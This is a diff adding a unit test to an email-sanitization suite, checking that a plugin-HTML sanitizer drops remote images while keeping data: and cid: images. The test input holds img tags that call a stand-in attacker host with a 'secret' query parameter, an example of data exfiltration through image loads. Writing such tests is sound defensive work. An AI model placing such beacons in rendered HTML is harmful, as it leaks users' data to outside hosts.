@@ -832,6 +832,17 @@ describe('email-sanitization', () => {
       expect(sanitizePluginBodyHtml('')).toBe('');
       expect(sanitizePluginBodyHtml('   ')).toBe('');
     });
+
+    it('drops remote images, which would carry data to any origin from the host page', () => {
+      // The sandbox CSP keeps a plugin to its manifest's httpOrigins; an
+      // https: image in text the host renders is a request to anywhere.
+      const out = sanitizePluginBodyHtml(
+        '<p>x</p><img src="https://attacker.example/x?d=secret"><img src="//attacker.example/y"><img src="data:image/png;base64,iVBORw0KGgo="><img src="cid:part1">',
+      );
+      expect(out).not.toContain('attacker.example');
+      expect(out).toContain('data:image/png;base64,');
+      expect(out).toContain('cid:part1');
+    });
   });
 
   // ALLOWED_URI_REGEXP excludes image/svg+xml on purpose (DOMPurify cannot see
